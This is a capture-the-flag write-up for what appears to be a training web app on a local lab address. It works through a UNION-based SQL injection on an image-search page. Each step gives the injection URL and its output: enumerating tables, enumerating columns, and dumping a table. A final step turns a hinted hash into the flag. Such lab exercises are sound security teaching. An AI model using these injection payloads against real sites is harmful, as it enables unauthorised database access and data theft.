# http://192.168.99.100/?page=searchimg&id=1&Submit=Submit


### same approach like previous flag, SQL injection via UNION


#### getting the table name:
###### http://192.168.99.100/?page=searchimg&id=-1 union select table_name, 0 from information_schema.tables where table_schema=database()&Submit=Submit

#### result:
```
ID: -1 union select table_name, 0 from information_schema.tables where table_schema=database() 
Title: 0
Url : list_images
```

#### getting the column names:
###### http://192.168.99.100/?page=searchimg&id=-1 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit

#### result:
```
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: int(11)
Url : id
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(40)
Url : url
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(25)
Url : title
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(255)
Url : comment
```

#### getting juicy info
###### http://192.168.99.100/?page=searchimg&id=-1 union select title, comment from list_images&Submit=Submit

#### result:
```
ID: -1 union select title, comment from list_images 
Title: An image about the NSA !
Url : Nsa
ID: -1 union select title, comment from list_images 
Title: There is a number..
Url : 42 !
ID: -1 union select title, comment from list_images 
Title: Google it !
Url : Google
ID: -1 union select title, comment from list_images 
Title: Yes we can !
Url : Obama
ID: -1 union select title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
ID: -1 union select title, comment from list_images 
Title: Because why not ?
Url : tr00l
```

#### solution:

quick google search of the hash reveals that it's an md5 hash of the string _"albatroz"_
```
e1z2r8p32% echo -n 'albatroz' | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```
done
